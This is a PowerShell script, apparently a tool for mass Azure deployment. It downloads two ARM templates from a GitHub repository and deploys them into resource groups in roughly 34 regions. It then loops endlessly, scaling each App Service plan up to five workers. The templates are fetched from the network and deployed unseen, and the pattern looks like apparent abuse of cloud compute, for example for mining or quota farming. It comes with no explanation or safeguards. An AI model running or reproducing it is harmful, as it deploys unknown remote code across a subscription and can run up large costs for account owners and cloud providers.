Connect-AzAccount -UseDeviceAuthentication
Remove-Item temp.json
Remove-Item temp1.json
Invoke-WebRequest 'https://raw.githubusercontent.com/ddao2604/tech/main/temp.json' -OutFile temp.json
Invoke-WebRequest 'https://raw.githubusercontent.com/ddao2604/tech/main/temp1.json' -OutFile temp1.json

$id = (Get-AzADUser).UserPrincipalName
$name = $id.Split("_")[0]
$name
(Get-Content temp.json).Replace('XNX', $name) | Set-Content temp.json
(Get-Content temp1.json).Replace('XNX', $name) | Set-Content temp1.json

$loclist = "EastUS,NorthEurope,WestEurope,SoutheastAsia,EastAsia,WestUS,JapanWest,JapanEast,EastUS2,NorthCentralUS,SouthCentralUS,BrazilSouth,AustraliaEast,AustraliaSoutheast,CentralUS,CentralIndia,SouthIndia,CanadaCentral,CanadaEast,WestUS2,UKWest,UKSouth,KoreaCentral,FranceCentral,SouthAfricaNorth,SwitzerlandNorth,GermanyWestCentral,UAENorth,NorwayEast,WestUS3,SwedenCentral,PolandCentral,ItalyNorth,IsraelCentral"
$loclist = $loclist.split(",");
$run = $true
While($run)
{
	foreach ($i in $loclist) {
		New-AzResourceGroup -Name $i -Location $i -Force
		New-AzResourceGroupDeployment -ResourceGroupName $i -TemplateFile temp.json
	}
	break
}
$run = $true
While($run)
{
	foreach ($i in $loclist) {
		$Resource = Get-AzAppServicePlan -ResourceGroupName $i
		$tname = $Resource.name
		$tname
		if($tname)
		{
			$wk = $Resource.Sku.Capacity
			$wk
			if($wk -lt 5)
			{
				$nw = $wk + 1
				Set-AzAppServicePlan -Name $Resource.name -ResourceGroupName $i -NumberofWorkers $nw
			}
			else
			{
				$loclist = $loclist | Where-Object { $_ -ne $i }
			}
		}
		else
		{
			New-AzResourceGroup -Name $i -Location $i -Force
			New-AzResourceGroupDeployment -ResourceGroupName $i -TemplateFile temp1.json
			
		}
	}
	$time = Get-Random -Minimum 50 -Maximum 80
	$waitSeconds = $time

	Start-Sleep -Seconds 0

	$waitSeconds..0 | Foreach-Object {
		Write-Host "`r          Time Remaining: $_ " -NoNewline -foregroundcolor green
		Start-Sleep -Seconds 1
	}
}


